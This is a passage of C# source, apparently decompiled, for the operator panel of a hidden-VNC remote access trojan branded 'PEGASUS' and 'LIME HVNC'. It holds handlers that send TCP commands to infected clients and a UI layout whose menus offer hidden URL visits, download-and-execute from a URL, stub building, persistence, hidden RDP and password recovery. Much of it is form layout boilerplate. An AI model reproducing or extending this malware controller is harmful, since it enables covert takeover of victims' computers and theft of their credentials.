				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8892* ", (TcpClient)tag);
			}
		}

		private void cOPYPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8893* ", (TcpClient)tag);
			}
		}

		private void rEMOVEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8894* ", (TcpClient)tag);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS));
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.label8 = new System.Windows.Forms.Label();
            this.chkSounds = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.Listener = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.visitURL = new System.Windows.Forms.ToolStripMenuItem();
            this.killChrome = new System.Windows.Forms.ToolStripMenuItem();
            this.resetScale = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.fromURL = new System.Windows.Forms.ToolStripMenuItem();
            this.hVNCCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.StartHvnc = new System.Windows.Forms.ToolStripMenuItem();
            this.hRDPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.iNSTALLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cOPYPROFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rEMOVEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aDDPERSISTENCEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aDDPERSISTENCEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.rEMOVEPERSISTENCEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Recover = new System.Windows.Forms.ToolStripMenuItem();
            this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uNINSTALLToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.ClientsOnline = new System.Windows.Forms.ToolStripStatusLabel();
            this.StartPort = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.label12 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.ListenPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.HVNCList = new System.Windows.Forms.ListView();
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.HVNCListenBtn = new System.Windows.Forms.ToolStripMenuItem();
            this.portToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HVNCListenPort = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.bunifuSeparator1 = new Guna2Separator();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).BeginInit();
            this.guna2ContextMenuStrip1.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).BeginInit();
            this.SuspendLayout();
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // guna2ShadowForm1
            // 
            this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.guna2ShadowForm1.TargetForm = this;
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("guna2ControlBox1.BackgroundImage")));
            this.guna2ControlBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.guna2ControlBox1.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox1.Location = new System.Drawing.Point(1458, 17);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.ShowIcon = false;
            this.guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
            this.guna2ControlBox1.TabIndex = 0;
            this.guna2ControlBox1.UseTransparentBackground = true;
            // 
            // guna2ControlBox2
            // 
            this.guna2ControlBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("guna2ControlBox2.BackgroundImage")));
            this.guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.guna2ControlBox2.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
            this.guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox2.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox2.Location = new System.Drawing.Point(1407, 17);
            this.guna2ControlBox2.Name = "guna2ControlBox2";
            this.guna2ControlBox2.ShowIcon = false;
            this.guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
            this.guna2ControlBox2.TabIndex = 1;
            this.guna2ControlBox2.UseTransparentBackground = true;
            // 
            // guna2ControlBox3
            // 
            this.guna2ControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox3.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("guna2ControlBox3.BackgroundImage")));
            this.guna2ControlBox3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.guna2ControlBox3.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
            this.guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.guna2ControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox3.IconColor = System.Drawing.Color.White;
            this.guna2ControlBox3.Location = new System.Drawing.Point(1356, 17);
            this.guna2ControlBox3.Name = "guna2ControlBox3";
            this.guna2ControlBox3.ShowIcon = false;
            this.guna2ControlBox3.Size = new System.Drawing.Size(45, 29);
            this.guna2ControlBox3.TabIndex = 2;
            this.guna2ControlBox3.UseTransparentBackground = true;
            // 
            // label1
            // 
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(689, 23);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(121, 24);
            this.label1.TabIndex = 3;
            this.label1.Text = "LIME HVNC";
            // 
            // label2
            // 
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(680, 22);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(139, 20);
            this.label2.TabIndex = 4;
            this.label2.Text = "[                        ]";
            // 
            // guna2PictureBox1
            // 
            this.guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2PictureBox1.ImageRotate = 0F;
            this.guna2PictureBox1.Location = new System.Drawing.Point(9, -3);
            this.guna2PictureBox1.Name = "guna2PictureBox1";
            this.guna2PictureBox1.Size = new System.Drawing.Size(92, 72);
            this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox1.TabIndex = 5;
            this.guna2PictureBox1.TabStop = false;
            this.guna2PictureBox1.UseTransparentBackground = true;
            this.guna2PictureBox1.Visible = false;
            // 
            // label8
            // 
            this.label8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.Transparent;
            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.Location = new System.Drawing.Point(826, 654);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(114, 15);
            this.label8.TabIndex = 23;
            this.label8.Text = "Connection Sound :";
            this.label8.Visible = false;
            // 
            // chkSounds
            // 
            this.chkSounds.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.chkSounds.BackColor = System.Drawing.Color.Transparent;
            this.chkSounds.CheckedState.BorderColor = System.Drawing.Color.DimGray;
            this.chkSounds.CheckedState.BorderRadius = 2;
            this.chkSounds.CheckedState.BorderThickness = 1;
            this.chkSounds.CheckedState.FillColor = System.Drawing.Color.Black;
            this.chkSounds.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.chkSounds.CheckedState.InnerBorderRadius = 2;
            this.chkSounds.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.chkSounds.Location = new System.Drawing.Point(946, 651);
            this.chkSounds.Name = "chkSounds";
            this.chkSounds.Size = new System.Drawing.Size(55, 20);
            this.chkSounds.TabIndex = 21;
            this.chkSounds.UncheckedState.BorderColor = System.Drawing.Color.DimGray;
            this.chkSounds.UncheckedState.BorderRadius = 2;
            this.chkSounds.UncheckedState.BorderThickness = 1;
            this.chkSounds.UncheckedState.FillColor = System.Drawing.Color.Black;
            this.chkSounds.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.chkSounds.UncheckedState.InnerBorderRadius = 2;
            this.chkSounds.UncheckedState.InnerColor = System.Drawing.Color.White;
            this.chkSounds.Visible = false;
            // 
            // Listener
            // 
            this.Listener.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.Listener.AutoSize = true;
            this.Listener.BackColor = System.Drawing.Color.Transparent;
            this.Listener.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Listener.ForeColor = System.Drawing.Color.White;
            this.Listener.Location = new System.Drawing.Point(1373, 651);
            this.Listener.Name = "Listener";
            this.Listener.Size = new System.Drawing.Size(79, 15);
            this.Listener.TabIndex = 20;
            this.Listener.Text = "Not Listening";
            // 
            // label5
            // 
            this.label5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(1274, 651);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(91, 15);
            this.label5.TabIndex = 19;
            this.label5.Text = "Listener Status:";
            // 
            // label6
            // 
            this.label6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(813, 649);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(204, 20);
            this.label6.TabIndex = 25;
            this.label6.Text = "[                                     ]";
            this.label6.Visible = false;
            // 
            // label9
            // 
            this.label9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.Color.White;
            this.label9.Location = new System.Drawing.Point(1259, 648);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(234, 20);
            this.label9.TabIndex = 27;
            this.label9.Text = "[                                           ]";
            // 
            // guna2ContextMenuStrip1
            // 
            this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.749999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(32, 32);
            this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem2,
            this.hVNCCToolStripMenuItem,
            this.StartHvnc,
            this.hRDPToolStripMenuItem,
            this.aDDPERSISTENCEToolStripMenuItem,
            this.Recover,
            this.builderToolStripMenuItem,
            this.uNINSTALLToolStripMenuItem1});
            this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.Black;
            this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(263, 180);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.toolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.visitURL,
            this.resetScale,
            this.toolStripMenuItem6});
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(262, 22);
            this.toolStripMenuItem2.Text = "    [REMOTE EXECUTE]";
            // 
            // visitURL
            // 
            this.visitURL.BackColor = System.Drawing.Color.Black;
            this.visitURL.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.visitURL.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.killChrome});
            this.visitURL.ForeColor = System.Drawing.Color.White;
            this.visitURL.Name = "visitURL";
            this.visitURL.Size = new System.Drawing.Size(249, 22);
            this.visitURL.Text = "VISIT URL HIDDEN";
            this.visitURL.Click += new System.EventHandler(this.visitURL_Click);
            // 
            // killChrome
            // 
            this.killChrome.BackColor = System.Drawing.Color.Black;
            this.killChrome.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.killChrome.ForeColor = System.Drawing.Color.White;
            this.killChrome.Name = "killChrome";
            this.killChrome.Size = new System.Drawing.Size(163, 22);
            this.killChrome.Text = "KILL CHROME";
            this.killChrome.Click += new System.EventHandler(this.killChrome_Click);
            // 
            // resetScale
            // 
            this.resetScale.BackColor = System.Drawing.Color.Black;
            this.resetScale.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.resetScale.ForeColor = System.Drawing.Color.White;
            this.resetScale.Name = "resetScale";
            this.resetScale.Size = new System.Drawing.Size(249, 22);
            this.resetScale.Text = "RESET SCALE";
            this.resetScale.Click += new System.EventHandler(this.resetScale_Click);
            // 
            // toolStripMenuItem6
            // 
            this.toolStripMenuItem6.BackColor = System.Drawing.Color.Black;
            this.toolStripMenuItem6.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.toolStripMenuItem6.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fromURL});
            this.toolStripMenuItem6.ForeColor = System.Drawing.Color.White;
            this.toolStripMenuItem6.Name = "toolStripMenuItem6";
            this.toolStripMenuItem6.Size = new System.Drawing.Size(249, 22);
            this.toolStripMenuItem6.Text = "UPDATE/EXECUTE CLIENT";
            // 
            // fromURL
            // 
            this.fromURL.BackColor = System.Drawing.Color.Black;
            this.fromURL.ForeColor = System.Drawing.Color.White;
            this.fromURL.Name = "fromURL";
            this.fromURL.Size = new System.Drawing.Size(145, 22);
            this.fromURL.Text = "FROM URL";
            this.fromURL.Click += new System.EventHandler(this.fromURL_Click);
            // 
            // hVNCCToolStripMenuItem
            // 
            this.hVNCCToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.hVNCCToolStripMenuItem.Name = "hVNCCToolStripMenuItem";
            this.hVNCCToolStripMenuItem.Size = new System.Drawing.Size(262, 22);
            this.hVNCCToolStripMenuItem.Text = "    [HVNC C++ STUB]";
            this.hVNCCToolStripMenuItem.Click += new System.EventHandler(this.hVNCCToolStripMenuItem_Click);
            // 
            // StartHvnc
            // 
            this.StartHvnc.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.StartHvnc.ForeColor = System.Drawing.Color.White;
            this.StartHvnc.Name = "StartHvnc";
            this.StartHvnc.Size = new System.Drawing.Size(262, 22);
            this.StartHvnc.Text = "    [HVNC C# STUB]";
            this.StartHvnc.Click += new System.EventHandler(this.StartHvnc_Click);
            // 
            // hRDPToolStripMenuItem
            // 
            this.hRDPToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.iNSTALLToolStripMenuItem,
            this.cOPYPROFILEToolStripMenuItem,
            this.rEMOVEToolStripMenuItem});
            this.hRDPToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.hRDPToolStripMenuItem.Name = "hRDPToolStripMenuItem";
            this.hRDPToolStripMenuItem.Size = new System.Drawing.Size(262, 22);
            this.hRDPToolStripMenuItem.Text = "    [HRDP]";
            this.hRDPToolStripMenuItem.Visible = false;
            // 
            // iNSTALLToolStripMenuItem
            // 
            this.iNSTALLToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.iNSTALLToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.iNSTALLToolStripMenuItem.Name = "iNSTALLToolStripMenuItem";
            this.iNSTALLToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.iNSTALLToolStripMenuItem.Text = "INSTALL";
            this.iNSTALLToolStripMenuItem.Click += new System.EventHandler(this.iNSTALLToolStripMenuItem_Click);
            // 
            // cOPYPROFILEToolStripMenuItem
            // 
            this.cOPYPROFILEToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.cOPYPROFILEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.cOPYPROFILEToolStripMenuItem.Name = "cOPYPROFILEToolStripMenuItem";
            this.cOPYPROFILEToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.cOPYPROFILEToolStripMenuItem.Text = "COPY PROFILE";
            this.cOPYPROFILEToolStripMenuItem.Click += new System.EventHandler(this.cOPYPROFILEToolStripMenuItem_Click);
            // 
            // rEMOVEToolStripMenuItem
            // 
            this.rEMOVEToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.rEMOVEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.rEMOVEToolStripMenuItem.Name = "rEMOVEToolStripMenuItem";
            this.rEMOVEToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.rEMOVEToolStripMenuItem.Text = "REMOVE";
            this.rEMOVEToolStripMenuItem.Click += new System.EventHandler(this.rEMOVEToolStripMenuItem_Click);
            // 
            // aDDPERSISTENCEToolStripMenuItem
            // 
            this.aDDPERSISTENCEToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.aDDPERSISTENCEToolStripMenuItem1,
            this.rEMOVEPERSISTENCEToolStripMenuItem});
            this.aDDPERSISTENCEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.aDDPERSISTENCEToolStripMenuItem.Name = "aDDPERSISTENCEToolStripMenuItem";
            this.aDDPERSISTENCEToolStripMenuItem.Size = new System.Drawing.Size(262, 22);
            this.aDDPERSISTENCEToolStripMenuItem.Text = "    [ADD PERSISTENCE]";
            // 
            // aDDPERSISTENCEToolStripMenuItem1
            // 
            this.aDDPERSISTENCEToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.aDDPERSISTENCEToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.aDDPERSISTENCEToolStripMenuItem1.Name = "aDDPERSISTENCEToolStripMenuItem1";
            this.aDDPERSISTENCEToolStripMenuItem1.Size = new System.Drawing.Size(244, 22);
            this.aDDPERSISTENCEToolStripMenuItem1.Text = "    ADD PERSISTENCE";
            this.aDDPERSISTENCEToolStripMenuItem1.Click += new System.EventHandler(this.aDDPERSISTENCEToolStripMenuItem_Click);
            // 
            // rEMOVEPERSISTENCEToolStripMenuItem
            // 
            this.rEMOVEPERSISTENCEToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.rEMOVEPERSISTENCEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.rEMOVEPERSISTENCEToolStripMenuItem.Name = "rEMOVEPERSISTENCEToolStripMenuItem";
            this.rEMOVEPERSISTENCEToolStripMenuItem.Size = new System.Drawing.Size(244, 22);
            this.rEMOVEPERSISTENCEToolStripMenuItem.Text = "    REMOVE PERSISTENCE";
            this.rEMOVEPERSISTENCEToolStripMenuItem.Click += new System.EventHandler(this.rEMOVEPERSISTENCEToolStripMenuItem_Click);
            // 
            // Recover
            // 
            this.Recover.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.Recover.ForeColor = System.Drawing.Color.White;
            this.Recover.Name = "Recover";
            this.Recover.Size = new System.Drawing.Size(262, 22);
            this.Recover.Text = "    [PASSWORDS RECOVERY]";
            this.Recover.Visible = false;
            this.Recover.Click += new System.EventHandler(this.Recover_Click);
            // 
            // builderToolStripMenuItem
            // 
            this.builderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.builderToolStripMenuItem.Name = "builderToolStripMenuItem";
            this.builderToolStripMenuItem.Size = new System.Drawing.Size(262, 22);
            this.builderToolStripMenuItem.Text = "    [PEGASUS LIME BUILDER]";
            this.builderToolStripMenuItem.Click += new System.EventHandler(this.builderToolStripMenuItem_Click);
            // 
            // uNINSTALLToolStripMenuItem1
            // 
            this.uNINSTALLToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.uNINSTALLToolStripMenuItem1.Name = "uNINSTALLToolStripMenuItem1";
            this.uNINSTALLToolStripMenuItem1.Size = new System.Drawing.Size(262, 22);
            this.uNINSTALLToolStripMenuItem1.Text = "    [UNINSTALL]";
            this.uNINSTALLToolStripMenuItem1.Click += new System.EventHandler(this.uNINSTALLToolStripMenuItem_Click);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.Transparent;
            this.label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(9)))), ((int)(((byte)(248)))), ((int)(((byte)(121)))));
            this.label10.Location = new System.Drawing.Point(201, 29);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(47, 20);
            this.label10.TabIndex = 32;
            this.label10.Text = "User";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.BackColor = System.Drawing.Color.Transparent;
